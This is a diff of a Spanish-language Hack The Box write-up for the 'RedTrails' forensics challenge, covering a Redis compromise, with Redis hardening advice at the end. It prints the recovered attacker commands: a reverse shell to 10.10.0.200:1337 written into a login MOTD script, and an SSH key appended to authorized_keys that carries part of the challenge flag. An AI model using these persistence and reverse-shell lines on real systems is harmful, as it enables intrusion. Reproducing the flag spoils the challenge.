@@ -1,3 +1,25 @@
+---
+layout: single
+title: Hack the box Challenge - RedTrails
+excerpt: Un reto relacionado con RedisCache
+date: 2025-07-12
+classes: wide
+header:
+  teaser: ../gits/sec/blog/assets/images/ic-forensics.svg
+  teaser_home_page: true
+  icon: ../assets/images/hackthebox.webp
+categories:
+   - hack the box
+   - challenge
+   - root
+   - redis
+tags:
+   - redis
+   - wireshark
+   - malware
+   - malware
+---
+
 CHALLENGE DESCRIPTION
 
 Our SOC team detected a suspicious activity on one of our redis instance. Despite the fact it was password protected it seems that the attacker still obtained access to it. We need to put in place a remediation strategy as soon as possible, to do that it's necessary to gather more informations about the attack used. NOTE: flag is composed by three parts.
@@ -188,6 +210,7 @@ Así que podemos desofucar esto con `echo "<base64 string>" | rev | base64 -d`. 
 ```bash
 ┌──(kali㉿kali)-[~/challenges/red]
 └─$ ./first.sh
+A
 echo 'bash -c "bash -i >& /dev/tcp/10.10.0.200/1337 0>&1"' > /etc/update-motd.d/00-header
 echo -e "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC8Vkq9UTKMakAx2Zq+PnZNc6nYuEK3ZVXxH15bbUeB+elCb3JbVJyBfvAuZ0sonfAqZsyq9Jg6/KGtNsEmtVKXroPXhzFumTgg7Z1NvrUNvnqLIcfxTnP1+/4X284hp0bF2VbITb6oQKgzRdOs8GtOasKaK0k//2E5o0RKIEdrx0aL5HBOGPx0p8GrGe4kRKoAokGXwDVT22LlBylRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IfLMD/FQNy1B4DYhsY62O7o2xR0vxkBEp5UhBAX8gOTG0wjzrUHxmdUimXgiy39YVZaTJQwLBtzJS//YhkewyF/+CP0H7wIKIErlf5WFK5skLYO6uKVpx6akGXY8GADnPU3iPK/MtBC+RqWssdkGqFIA5xG2Fn+Klid9Obm1uXexJfYVjJMOfvuqtb6KcgLmi5uRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IlSxaiOAD2iNJboNuUIxMH/9HNYKd6mlwUpovqFcGBqXizcF21bxNGoOE31Vfox2fq2qW30BDWtHrrYi76iLh02FerHEYHdQAAA08NfUHyCw0fVl/qt6bAgKSb02k691lcDAo5JpEEzNQpub0X8xJItrbw==HTB{r3d15_1n574nc35" >> ~/.ssh/authorized_keys
 ```
@@ -196,12 +219,14 @@ echo -e "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC8Vkq9UTKMakAx2Zq+PnZNc6nYuEK3Z
 
 - Con echo `'bash -c "bash -i >& /dev/tcp/10.10.0.200/1337 0>&1"' > /etc/update-motd.d/00-header ` se está sobrescribiendo 00-header con un script que, cuando se ejecute, lanzará un reverse shell hacia (10.10.0.200, puerto 1337). Cada vez que alguien inicie sesión, ese script se ejecutará y se recibirá la conexión inversa.
 
-
+```bash 
 #!/usr/bin/env python
+A
 
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 import binascii
 
+A
 # Your hex ciphertext
 
 ciphertext_hex = "adb4bb64d395eff7d093f5fba5481ab0e71be15728b38130a6d4276b8b5bdb2f"
@@ -221,24 +246,16 @@ padding_len = plaintext[-1]
 plaintext = plaintext[:-padding_len]
 
 print(plaintext.decode('utf-8'))
+```
 
+## ¿Cómo mitigar esto?
 
-
-
-## 🧯 ¿Cómo mitigar esto?
-
-Si estás realizando un análisis forense o blue team:
-
-* Verifica si Redis está **escuchando en interfaces públicas** (`bind 0.0.0.0`) en el archivo de configuración (`redis.conf`).
-* Asegura que Redis tenga:
+* Verificar si Redis está **escuchando en interfaces públicas** (`bind 0.0.0.0`) en el archivo de configuración (`redis.conf`).
+* Asegurarse que Redis tenga:
 
   * Autenticación fuerte (`requirepass`)
   * Desactivado el comando `CONFIG` o restringido mediante `rename-command`
   * Cargado con `protected-mode yes`
-* Inspecciona si hay **módulos cargados inesperadamente** (`MODULE LIST`).
-* Busca archivos `.so`, `root`, o `cron` en `/var/spool/cron` o `/data`.
-
----
-
-
+* Inspeccionar si hay **módulos cargados inesperadamente** (`MODULE LIST`).
+* Buscar archivos `.so`, `root`, o `cron` en `/var/spool/cron` o `/data`.
 
